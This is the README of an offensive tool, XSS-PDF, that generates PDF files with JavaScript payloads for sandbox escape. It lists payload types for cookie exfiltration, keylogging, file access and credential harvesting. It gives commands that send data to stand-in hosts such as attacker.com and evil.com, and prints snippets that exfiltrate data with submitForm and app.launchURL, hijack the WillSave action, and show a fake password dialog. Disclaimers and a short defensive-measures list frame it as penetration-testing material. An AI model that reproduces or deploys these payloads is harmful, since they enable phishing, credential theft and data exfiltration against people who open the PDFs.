# XSS-PDF Generator - Advanced PDF Sandbox Escape Tool

An advanced tool for generating PDF files with sophisticated JavaScript payloads designed to escape PDF sandbox environments. This tool creates PDF files containing various sandbox escape techniques for security testing and penetration testing purposes.

## ⚠️ Legal Disclaimer

This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.

## 🔒 PDF Sandbox Context

PDF files are typically rendered in sandboxed environments that restrict access to:
- Browser DOM APIs (document.cookie, XMLHttpRequest, etc.)
- File system access through standard web APIs
- Direct network communication through browser APIs

This tool implements **PDF-specific JavaScript APIs** and **sandbox escape techniques** to overcome these limitations.

## 🚀 Features

- **12 Different PDF Sandbox Escape Types**: Comprehensive collection of PDF-specific attack vectors
- **PDF-Specific JavaScript APIs**: Uses proper PDF JavaScript context instead of browser APIs
- **Multiple Sandbox Escape Techniques**: URL launching, form submission, dialog manipulation
- **URL Integration**: Support for data exfiltration to external URLs via PDF escape methods
- **Custom Payloads**: Ability to inject custom PDF JavaScript code
- **Enhanced PDF Structure**: Sophisticated PDF structure for better escape potential
- **Multiple Output Formats**: PDF and HTML file generation
- **Timestamped Files**: Automatic file naming with timestamps

## 📋 Available PDF Sandbox Escape Types

| Type | Description | Escape Method |
|------|-------------|---------------|
| `alert` | Basic PDF alert payload | PDF JavaScript execution test |
| `cookie` | PDF data exfiltration | Form submission + URL launching |
| `redirect` | PDF URL launching escape | app.launchURL() sandbox escape |
| `form` | PDF form submission escape | this.submitForm() data exfiltration |
| `dom` | PDF document manipulation | PDF property and state manipulation |
| `obfuscated` | Obfuscated PDF payload | Encoded PDF JavaScript |
| `timer` | PDF timer-based escape | app.setTimeOut() and action scheduling |
| `keylog` | PDF event monitoring | PDF action and field event hijacking |
| `network` | PDF network sandbox escape | URL launching + form submission |
| `file` | PDF file system escape | browseForDoc, saveAs, print exploitation |
| `action` | PDF action-based escape | Document action hijacking |
| `dialog` | PDF dialog manipulation | Dialog exploitation for credential harvesting |

## 🛠️ Installation & Requirements

### Requirements
- Python 3.x
- No external dependencies required (uses only standard library)

### Installation
```bash
git clone https://github.com/SNGWN/XSS-PDF.git
cd XSS-PDF
```

## 📖 Usage

### Basic Commands

```bash
# Show help and available options
python3 script.py --help

# List all available XSS payload types
python3 script.py --list-types

# Generate basic PDF files (backward compatibility)
python3 script.py -o pdf

# Generate specific XSS payload type
python3 script.py -t alert

# Generate all XSS payload types
python3 script.py -t all

# Generate HTML XSS test file
python3 script.py -o html
```

### Advanced PDF Sandbox Escape Usage

```bash
# PDF data exfiltration via form submission escape
python3 script.py -t cookie -u http://attacker.com/collect

# PDF action-based sandbox escape
python3 script.py -t action -u http://collaborator.burpsuite.com

# PDF dialog manipulation for credential harvesting
python3 script.py -t dialog -u http://logger.example.com

# PDF file system escape attempts
python3 script.py -t file

# Generate all PDF sandbox escape types
python3 script.py -t all -u http://collaborator.burpsuite.com

# PDF network escape via URL launching
python3 script.py -t network -u https://webhook.site/unique-id
```

## 🏁 Command Line Flags

| Flag | Long Form | Description | Example |
|------|-----------|-------------|---------|
| `-h` | `--help` | Show help message | `python3 script.py --help` |
| `-u` | `--url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
| `-o` | `--output` | Output format (pdf/html) | `-o pdf` |
| `-s` | `--script` | Custom JavaScript payload | `-s "app.alert('test')"` |
| `-t` | `--type` | XSS payload type or 'all' | `-t cookie` |
| | `--list-types` | List available payload types | `--list-types` |

## 📁 Output Files

### PDF Files
Generated PDF files follow the naming convention: `xss_<type>_<timestamp>.pdf`

Examples:
- `xss_alert_20240115_143022.pdf`
- `xss_cookie_20240115_143025.pdf`
- `xss_custom_20240115_143030.pdf`

### HTML Files
Generated HTML files follow the naming convention: `xss_test_<timestamp>.html`

Example:
- `xss_test_20240115_143035.html`

## 🎯 PDF Sandbox Escape Examples

### PDF Form Submission Escape
```javascript
// PDF-specific data exfiltration
this.submitForm({
    cURL: "http://attacker.com/collect",
    cSubmitAs: "HTML",
    cCharset: "utf-8"
});
```

### PDF URL Launching Escape
```javascript
// Escape sandbox via URL launching
app.launchURL("http://attacker.com/escape?data=" + encodeURIComponent(data), true);
```

### PDF Action Hijacking
```javascript
// Hijack document actions for persistent escape
this.setAction("WillSave", 
    "app.launchURL('http://attacker.com/save-intercept', true);"
);
```

### PDF Dialog Exploitation
```javascript
// Credential harvesting via PDF dialogs
var creds = app.response({
    cQuestion: "Enter your credentials:",
    cTitle: "Security Check",
    bPassword: true
});
```

## 🔍 PDF Security Testing Methodology

1. **Generate PDF Test Files**: Use the tool to create PDF files with various sandbox escape payloads
2. **Upload/Embed Testing**: Test file upload functionality on target applications
3. **PDF Viewer Analysis**: Test different PDF viewers (Adobe Reader, browser built-ins, etc.)
4. **Sandbox Escape Monitoring**: Monitor for successful escapes via URL launching, form submission
5. **Data Exfiltration Testing**: Use URL flag to test actual data extraction capabilities
6. **Action Persistence Testing**: Test if PDF actions persist across viewer sessions
7. **Dialog Security Testing**: Test credential harvesting via PDF dialog manipulation

## 🛡️ PDF-Specific Defensive Measures

To protect against PDF sandbox escape attacks:

- **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
- **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
- **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
- **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes
- **Content Security Policy**: Implement CSP headers that restrict PDF-initiated requests
- **PDF Content Analysis**: Scan uploaded PDFs for JavaScript and suspicious structures
- **User Education**: Train users on PDF security risks and safe viewing practices

## 🚨 Security Considerations

- Always obtain proper authorization before testing
- Use in controlled environments only
- Be aware of legal implications
- Respect responsible disclosure practices
- Monitor and log all testing activities

## 📈 Changelog

### Version 3.0 (Current) - PDF Sandbox Escape Enhancement
- **Complete rewrite for PDF sandbox context**
- **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
- **12 sophisticated sandbox escape techniques**
- **Enhanced PDF structure**: More complex PDF objects for better escape potential
- **Action-based persistence**: PDF action hijacking for persistent attacks
- **Dialog exploitation**: Credential harvesting via PDF dialogs
- **Form submission escapes**: Data exfiltration via PDF form submission
- **URL launching escapes**: Sandbox escape via app.launchURL()
- **File system escape attempts**: PDF-specific file access methods
- **Comprehensive error handling for PDF context**

### Version 1.0 (Legacy)
- Basic PDF generation with simple XSS payloads
- Limited to 2-3 payload types
- Basic URL and custom script support

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add comprehensive tests
4. Follow existing code style
5. Submit a pull request with detailed description

## 📄 License

This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.

## 🔗 Resources

- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PDF Security Research](https://blog.didierstevens.com/programs/pdf-tools/)
- [JavaScript Security Best Practices](https://developer.mozilla.org/en-US/docs/Web/Security)

---

**Remember**: This tool is for authorized security testing only. Always obtain proper permission before testing any systems.